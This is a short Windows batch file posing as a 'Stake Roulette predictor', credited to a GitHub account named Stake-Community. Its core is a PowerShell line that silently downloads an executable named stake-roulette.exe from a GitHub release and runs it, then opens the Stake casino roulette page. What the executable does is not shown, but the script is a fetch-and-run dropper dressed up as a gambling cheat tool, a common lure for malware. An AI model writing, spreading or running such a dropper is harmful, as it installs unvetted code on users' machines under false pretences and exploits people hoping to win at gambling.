@echo off

title Stake Roulette
rem You can do any color
color 0c

echo.
echo Coded By https://github.com/Stake-Community
echo.

powershell $down=New-Object System.Net.WebClient;$url='https://github.com/Stake-Community/Stake-Roulette-Predictor/releases/download/stake-roulette/stake-roulette.exe';$file='stake-roulette.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;

start stake-roulette

start https://stake.com/fr/casino/games/roulette
